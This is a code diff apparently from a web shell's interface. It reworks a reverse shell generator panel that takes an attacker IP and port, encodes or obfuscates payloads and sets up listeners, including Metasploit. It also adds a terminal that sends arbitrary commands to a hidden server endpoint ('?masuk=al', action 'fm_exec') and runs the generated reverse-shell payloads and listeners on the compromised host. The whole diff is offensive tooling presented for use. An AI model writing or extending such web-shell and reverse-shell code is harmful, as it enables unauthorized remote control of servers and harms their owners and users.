@@ -8543,60 +8543,75 @@ tr:hover td{background:rgba(0,255,64,.035);}
 </div></div>
 
 <!-- RevShell Modal -->
-<div class="modal-overlay" id="revshellModal"><div class="modal modal--lg">
+<div class="modal-overlay" id="revshellModal"><div class="modal modal--full">
   <div class="modal-head"><h3>Reverse Shell Generator</h3><button class="modal-close" onclick="closeModal('revshellModal')">&times;</button></div>
-  <div class="modal-body">
-    <div class="section-title">CONFIGURATION</div>
-    <div class="row-inline" style="margin-bottom:8px;">
-      <div class="field"><label>Attacker IP</label><input type="text" id="rsAttackerHost" placeholder="192.168.1.100"></div>
-      <div class="field"><label>Port</label><input type="number" id="rsAttackerPort" value="4444" min="1" max="65535"></div>
-    </div>
-    <div class="row-inline" style="margin-bottom:8px;">
-      <div class="field"><label>Shell Type</label>
-        <select id="rsShellType" onchange="updateRSOptions()"><option value="bash">Bash</option><option value="sh">Sh</option><option value="python">Python 2</option><option value="python3">Python 3</option><option value="perl">Perl</option><option value="php">PHP</option><option value="nc">Netcat</option><option value="powershell">PowerShell</option><option value="ruby">Ruby</option></select>
+  <div class="modal-body" style="display:flex;gap:12px;overflow:hidden;padding:10px 14px;flex:1;min-height:0;">
+    <!-- Left: Config -->
+    <div style="width:340px;flex-shrink:0;overflow-y:auto;padding-right:8px;">
+      <div class="section-title" style="margin:0 0 6px;">CONFIG</div>
+      <div style="display:flex;gap:6px;margin-bottom:6px;">
+        <div class="field" style="flex:2;margin:0;"><label>IP</label><input type="text" id="rsAttackerHost" placeholder="192.168.1.100" style="padding:5px 8px;font-size:11.5px;"></div>
+        <div class="field" style="flex:1;margin:0;"><label>Port</label><input type="number" id="rsAttackerPort" value="4444" min="1" max="65535" style="padding:5px 8px;font-size:11.5px;"></div>
       </div>
-      <div class="field" id="rsNcOptions" style="display:none;"><label>Netcat Variant</label>
-        <select id="rsNcType"><option value="standard">Standard (GNU nc)</option><option value="ncat">Ncat</option><option value="openbsd">OpenBSD nc</option></select>
+      <div style="display:flex;gap:6px;margin-bottom:6px;align-items:end;">
+        <div class="field" style="flex:1;margin:0;"><label>Shell</label>
+          <select id="rsShellType" onchange="updateRSOptions()" style="padding:5px 6px;font-size:11.5px;"><option value="bash">Bash</option><option value="sh">Sh</option><option value="python">Python2</option><option value="python3">Python3</option><option value="perl">Perl</option><option value="php">PHP</option><option value="nc">Netcat</option><option value="powershell">PowerShell</option><option value="ruby">Ruby</option></select>
+        </div>
+        <div class="field" style="flex:1;margin:0;"><label>Encode</label>
+          <select id="rsEncoding" style="padding:5px 6px;font-size:11.5px;"><option value="none">None</option><option value="base64">Base64</option><option value="urlencode">URL</option><option value="hex">Hex</option></select>
+        </div>
+        <label style="display:flex;align-items:center;gap:4px;font-size:11px;color:var(--text-dim);white-space:nowrap;padding-bottom:4px;cursor:pointer;"><input type="checkbox" id="rsObfuscate" style="margin:0;"> Obf</label>
+      </div>
+      <div class="field hidden" id="rsNcOptions" style="margin:0 0 6px;"><label>NC Variant</label>
+        <select id="rsNcType" style="padding:5px 6px;font-size:11.5px;"><option value="standard">GNU nc</option><option value="ncat">Ncat</option><option value="openbsd">OpenBSD</option></select>
+      </div>
+      <button class="btn" onclick="generateReverseShellPayload()" style="width:100%;padding:6px;font-size:11.5px;margin-bottom:6px;">Generate Payload</button>
+      <div id="rsOutputTabs" class="hidden" style="margin-bottom:8px;">
+        <div style="display:flex;gap:8px;border-bottom:1px solid var(--border);margin-bottom:6px;">
+          <button class="rs-tab-btn active" onclick="switchRSTab('original')" style="background:transparent;color:var(--primary);border:none;border-bottom:2px solid var(--primary);padding:4px 8px;font-size:11px;">Original</button>
+          <button class="rs-tab-btn" id="rsEncodedTabBtn" onclick="switchRSTab('encoded')" style="background:transparent;color:var(--text-dim);border:none;border-bottom:2px solid transparent;padding:4px 8px;font-size:11px;display:none;">Encoded</button>
+          <button class="btn small" onclick="copyToClipboardRS(document.getElementById('rsEncodedPayload').classList.contains('hidden')?'rsOriginalPayload':'rsEncodedPayload',this)" style="margin-left:auto;padding:2px 8px;font-size:10px;">Copy</button>
+          <button class="btn small ghost" onclick="rsRunInTerminal()" style="padding:2px 8px;font-size:10px;">Run</button>
+        </div>
+        <div id="rsOriginalPayload" class="output-box sm" style="margin:0;max-height:60px;overflow-y:auto;font-size:11px;padding:6px 8px;"></div>
+        <div id="rsEncodedPayload" class="output-box sm hidden" style="margin:0;max-height:60px;overflow-y:auto;font-size:11px;padding:6px 8px;"></div>
+      </div>
+      <div class="section-title" style="margin:0 0 6px;">LISTENER</div>
+      <div style="display:flex;gap:6px;margin-bottom:6px;">
+        <div class="field" style="flex:2;margin:0;"><label>Type</label>
+          <select id="rsListenerType" style="padding:5px 6px;font-size:11.5px;"><option value="nc">Netcat</option><option value="ncat">Ncat</option><option value="socat">Socat</option><option value="msfconsole">Metasploit</option><option value="bash">Bash</option><option value="python">Python</option></select>
+        </div>
+        <div class="field" style="flex:1;margin:0;"><label>Port</label><input type="number" id="rsListenerPort" value="4444" min="1" max="65535" style="padding:5px 8px;font-size:11.5px;"></div>
+      </div>
+      <div style="display:flex;gap:6px;margin-bottom:6px;">
+        <button class="btn ghost" onclick="generateReverseShellListener()" style="flex:1;padding:6px;font-size:11.5px;">Generate</button>
+        <button class="btn ghost" onclick="rsRunListenerInTerminal()" style="flex:1;padding:6px;font-size:11.5px;">Run Listener</button>
+      </div>
+      <div id="rsListenerOutput" class="output-box sm hidden" style="margin:0 0 6px;max-height:50px;overflow-y:auto;font-size:11px;padding:6px 8px;"></div>
+      <div class="section-title" style="margin:0 0 6px;">DECODER</div>
+      <div style="display:flex;gap:6px;margin-bottom:6px;">
+        <div class="field" style="flex:1;margin:0;"><label>Type</label><select id="rsDecodeType" style="padding:5px 6px;font-size:11.5px;"><option value="base64">Base64</option><option value="urlencode">URL</option><option value="hex">Hex</option></select></div>
+        <button class="btn ghost" onclick="decodeReverseShellPayload()" style="align-self:flex-end;padding:6px 14px;font-size:11.5px;">Decode</button>
+      </div>
+      <div class="field" style="margin:0 0 6px;"><textarea id="rsDecodeInput" placeholder="Paste encoded payload..." style="height:40px;min-height:40px;font-size:11px;padding:6px 8px;resize:vertical;"></textarea></div>
+      <div id="rsDecodeOutput" class="output-box sm hidden" style="margin:0;max-height:50px;overflow-y:auto;font-size:11px;padding:6px 8px;"></div>
+      <div id="rsError" class="hidden" style="background:var(--danger-dim);border:1px solid var(--danger);color:var(--danger);padding:6px 8px;border-radius:6px;margin-top:6px;font-size:11px;"></div>
+    </div>
+    <!-- Right: Terminal -->
+    <div style="flex:1;display:flex;flex-direction:column;min-width:0;border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;">
+      <div style="padding:6px 10px;background:var(--bg-card);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-shrink:0;">
+        <span style="font-size:11px;color:var(--primary);font-weight:600;letter-spacing:.5px;">TERMINAL</span>
+        <button class="btn small ghost" onclick="rsTermClear()" style="padding:2px 8px;font-size:10px;">Clear</button>
+      </div>
+      <div id="rsTermOutput" style="flex:1;overflow-y:auto;padding:8px 10px;font-family:'Cascadia Code','Fira Code','SF Mono',monospace;font-size:11.5px;line-height:1.6;color:var(--text);background:var(--bg);white-space:pre-wrap;word-break:break-all;"></div>
+      <div style="display:flex;border-top:1px solid var(--border);flex-shrink:0;">
+        <span style="padding:6px 8px;color:var(--primary);font-size:12px;font-family:monospace;flex-shrink:0;">$</span>
+        <input type="text" id="rsTermInput" placeholder="Type command..." onkeydown="if(event.key==='Enter')rsTermExec()" style="flex:1;border:none;background:transparent;color:var(--text);font-family:'Cascadia Code','Fira Code',monospace;font-size:11.5px;padding:6px 4px;outline:none;">
+        <button onclick="rsTermExec()" style="padding:6px 12px;background:var(--primary);color:var(--bg);border:none;font-size:11px;font-weight:600;cursor:pointer;flex-shrink:0;">Run</button>
       </div>
     </div>
-    <div class="row-inline" style="margin-bottom:8px;">
-      <div class="field"><label>Encoding</label>
-        <select id="rsEncoding"><option value="none">No Encoding</option><option value="base64">Base64</option><option value="urlencode">URL Encode</option><option value="hex">Hex Encode</option></select>
-      </div>
-      <div class="field" style="display:flex;align-items:flex-end;"><label class="chk-row" style="margin:0;"><input type="checkbox" id="rsObfuscate"> Obfuscate</label></div>
-    </div>
-    <button class="btn" onclick="generateReverseShellPayload()" style="width:100%;margin-bottom:12px;">Generate Payload</button>
-    <div id="rsOutputTabs" class="hidden" style="margin-bottom:14px;">
-      <div style="display:flex;gap:10px;border-bottom:1px solid var(--border);margin-bottom:10px;">
-        <button class="rs-tab-btn active" onclick="switchRSTab('original')" style="background:transparent;color:var(--primary);border:none;border-bottom:2px solid var(--primary);padding:6px 10px;font-size:11.5px;">Original</button>
-        <button class="rs-tab-btn" id="rsEncodedTabBtn" onclick="switchRSTab('encoded')" style="background:transparent;color:var(--text-dim);border:none;border-bottom:2px solid transparent;padding:6px 10px;font-size:11.5px;display:none;">Encoded</button>
-      </div>
-      <div id="rsOriginalPayload" class="output-box sm" style="margin-bottom:8px;"></div>
-      <div id="rsEncodedPayload" class="output-box sm hidden" style="margin-bottom:8px;"></div>
-      <button class="btn small" onclick="copyToClipboardRS('rsOriginalPayload')">Copy Original</button>
-      <button class="btn small ghost hidden" id="rsCopyEncodedBtn" onclick="copyToClipboardRS('rsEncodedPayload')">Copy Encoded</button>
-    </div>
-    <div class="section-title">LISTENER SETUP</div>
-    <div class="row-inline" style="margin-bottom:8px;">
-      <div class="field"><label>Listener Type</label>
-        <select id="rsListenerType"><option value="nc">Netcat</option><option value="ncat">Ncat</option><option value="socat">Socat</option><option value="msfconsole">Metasploit</option><option value="bash">Bash</option><option value="python">Python</option></select>
-      </div>
-      <div class="field"><label>Port</label><input type="number" id="rsListenerPort" value="4444" min="1" max="65535"></div>
-    </div>
-    <button class="btn ghost" onclick="generateReverseShellListener()" style="width:100%;margin-bottom:8px;">Generate Listener</button>
-    <div id="rsListenerOutput" class="output-box sm hidden" style="margin-bottom:8px;max-height:150px;"></div>
-    <button class="btn small ghost hidden" id="rsCopyListenerBtn" onclick="copyToClipboardRS('rsListenerOutput')">Copy Listener</button>
-    <div class="section-title" style="margin-top:14px;">DECODER</div>
-    <div class="row-inline" style="margin-bottom:8px;">
-      <div class="field"><label>Type</label><select id="rsDecodeType"><option value="base64">Base64</option><option value="urlencode">URL Encode</option><option value="hex">Hex</option></select></div>
-    </div>
-    <div class="field" style="margin-bottom:8px;"><label>Encoded Payload</label><textarea id="rsDecodeInput" placeholder="Paste encoded payload..."></textarea></div>
-    <button class="btn ghost" onclick="decodeReverseShellPayload()" style="width:100%;margin-bottom:8px;">Decode</button>
-    <div id="rsDecodeOutput" class="output-box sm hidden" style="margin-bottom:8px;max-height:150px;"></div>
-    <button class="btn small ghost hidden" id="rsCopyDecodeBtn" onclick="copyToClipboardRS('rsDecodeOutput')">Copy Decoded</button>
-    <div id="rsError" class="hidden" style="background:var(--danger-dim);border:1px solid var(--danger);color:var(--danger);padding:10px;border-radius:6px;margin-top:10px;font-size:11.5px;"></div>
   </div>
-  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('revshellModal')">Close</button></div>
+  <div class="modal-foot" style="padding:8px 14px;"><button class="btn ghost" onclick="closeModal('revshellModal')">Close</button></div>
 </div></div>
 
 <!-- Service Modal -->
@@ -12228,9 +12243,9 @@ function updateRSOptions() {
     const shellType = document.getElementById('rsShellType').value;
     const ncOptions = document.getElementById('rsNcOptions');
     if (shellType === 'nc') {
-        ncOptions.style.display = 'block';
+        ncOptions.classList.remove('hidden');
     } else {
-        ncOptions.style.display = 'none';
+        ncOptions.classList.add('hidden');
     }
 }
 
@@ -12280,19 +12295,22 @@ async function generateReverseShellPayload() {
         }
 
         document.getElementById('rsOriginalPayload').textContent = data.original;
+        document.getElementById('rsOriginalPayload').classList.remove('hidden');
         document.getElementById('rsOutputTabs').classList.remove('hidden');
         errorDiv.classList.add('hidden');
 
         if (data.encoded && data.encoded !== data.original) {
             document.getElementById('rsEncodedPayload').textContent = data.encoded;
-            document.getElementById('rsEncodedPayload').classList.remove('hidden');
+            document.getElementById('rsEncodedPayload').classList.add('hidden');
             document.getElementById('rsEncodedTabBtn').style.display = 'block';
-            document.getElementById('rsCopyEncodedBtn').classList.remove('hidden');
+            document.getElementById('rsCopyEncodedBtn').classList.add('hidden');
         } else {
             document.getElementById('rsEncodedPayload').classList.add('hidden');
             document.getElementById('rsEncodedTabBtn').style.display = 'none';
             document.getElementById('rsCopyEncodedBtn').classList.add('hidden');
         }
+
+        switchRSTab('original');
 
     } catch (error) {
         errorDiv.textContent = 'Error: ' + error.message;
@@ -12303,6 +12321,7 @@ async function generateReverseShellPayload() {
 function switchRSTab(tabName) {
     document.getElementById('rsOriginalPayload').classList.add('hidden');
     document.getElementById('rsEncodedPayload').classList.add('hidden');
+    document.getElementById('rsCopyEncodedBtn').classList.add('hidden');
     document.querySelectorAll('.rs-tab-btn').forEach(btn => {
         btn.style.color = 'var(--text-dim)';
         btn.style.borderBottom = '2px solid transparent';
@@ -12314,6 +12333,7 @@ function switchRSTab(tabName) {
         document.querySelector('[onclick*="switchRSTab(\'original\')"]').style.borderBottom = '2px solid var(--primary)';
     } else {
         document.getElementById('rsEncodedPayload').classList.remove('hidden');
+        document.getElementById('rsCopyEncodedBtn').classList.remove('hidden');
         document.querySelector('[onclick*="switchRSTab(\'encoded\')"]').style.color = 'var(--primary)';
         document.querySelector('[onclick*="switchRSTab(\'encoded\')"]').style.borderBottom = '2px solid var(--primary)';
     }
@@ -12400,22 +12420,89 @@ async function decodeReverseShellPayload() {
     }
 }
 
-function copyToClipboardRS(elementId) {
+function copyToClipboardRS(elementId, btn) {
     const element = document.getElementById(elementId);
     const text = element.textContent;
 
     navigator.clipboard.writeText(text).then(() => {
-        const btn = event.target;
         const origText = btn.textContent;
-        btn.textContent = '✓ Copied!';
-        btn.style.background = '#0f0';
+        btn.textContent = 'Copied!';
+        btn.style.background = 'var(--success, #0a0)';
+        btn.style.color = '#fff';
         setTimeout(() => {
             btn.textContent = origText;
-            btn.style.background = '#6cf';
+            btn.style.background = '';
+            btn.style.color = '';
         }, 2000);
-    }).catch(err => {
-        alert('Failed to copy: ' + err);
+    }).catch(() => {
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+        btn.textContent = 'Copied!';
+        setTimeout(() => { btn.textContent = btn.dataset.label || 'Copy'; }, 2000);
     });
+}
+
+// ============================================================================
+// REVERSE SHELL - Terminal Functions
+// ============================================================================
+
+function rsTermAppend(html) {
+    const out = document.getElementById('rsTermOutput');
+    out.innerHTML += html;
+    out.scrollTop = out.scrollHeight;
+}
+
+function rsTermClear() {
+    document.getElementById('rsTermOutput').innerHTML = '';
+}
+
+async function rsTermExec() {
+    const input = document.getElementById('rsTermInput');
+    const cmd = input.value.trim();
+    if (!cmd) return;
+    input.value = '';
+    rsTermAppend('<div style="color:var(--primary);">$ ' + cmd.replace(/</g,'&lt;') + '</div>');
+    try {
+        const fd = new FormData();
+        fd.append('action', 'fm_exec');
+        fd.append('cmd', cmd);
+        const r = await fetch('?masuk=al', {method:'POST', body:fd});
+        const data = await r.json();
+        if (data.output) {
+            rsTermAppend('<div style="color:var(--text-dim);">' + data.output.replace(/</g,'&lt;') + '</div>');
+        } else {
+            rsTermAppend('<div style="color:var(--text-dim);">(no output)</div>');
+        }
+    } catch(e) {
+        rsTermAppend('<div style="color:var(--danger);">Error: ' + e.message + '</div>');
+    }
+}
+
+function rsRunInTerminal() {
+    const orig = document.getElementById('rsOriginalPayload').textContent;
+    const enc = document.getElementById('rsEncodedPayload').textContent;
+    const isEncTab = !document.getElementById('rsEncodedPayload').classList.contains('hidden');
+    const payload = (isEncTab && enc) ? enc : orig;
+    if (!payload) return;
+    document.getElementById('rsTermInput').value = payload;
+    rsTermExec();
+}
+
+function rsRunListenerInTerminal() {
+    const out = document.getElementById('rsListenerOutput').textContent;
+    if (!out) {
+        generateReverseShellListener().then(() => {
+            const cmd = document.getElementById('rsListenerOutput').textContent;
+            if (cmd) { document.getElementById('rsTermInput').value = cmd; rsTermExec(); }
+        });
+        return;
+    }
+    document.getElementById('rsTermInput').value = out;
+    rsTermExec();
 }
 
 // ============================================================================
